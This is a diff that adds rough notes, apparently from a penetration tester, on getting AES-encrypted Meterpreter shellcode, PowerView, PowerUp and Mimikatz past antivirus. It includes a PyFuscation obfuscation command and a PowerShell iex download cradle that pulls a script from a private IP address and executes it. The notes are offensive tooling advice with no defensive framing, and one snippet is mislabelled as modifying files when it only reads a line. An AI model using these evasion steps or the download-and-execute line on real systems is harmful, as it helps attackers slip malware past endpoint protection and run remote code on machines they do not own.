@@ -136,3 +136,30 @@ namespace Aes_Example
     }
 }
 ```
+
+# Shellcode loader for 
+
+cn I load aes encypted shellcode from meterpreter into the thing
+
+# trying to obfuscate powerview and mimikatz
+
+https://www.cyberguider.com/bypassing-av-cat-vs-mouse/
+
+Get-MpThreatDetection - this will list all the threats
+
+pyobfuscation works with powerview
+
+```
+# python PyFuscation.py -fpv --ps powerup.ps1 
+```
+
+```
+iex (New-Object Net.WebClient).DownloadString('http://10.10.6.12:8000/08012022_08_34_48.ps1');danger
+```
+
+a command to modify files in powershell
+```
+PS C:\> Get-Content D:\MultipleLineExamples.txt | Select -First 10 | Select -Last 1
+
+get-content myfile.txt | select -first 1 -skip 9
+```
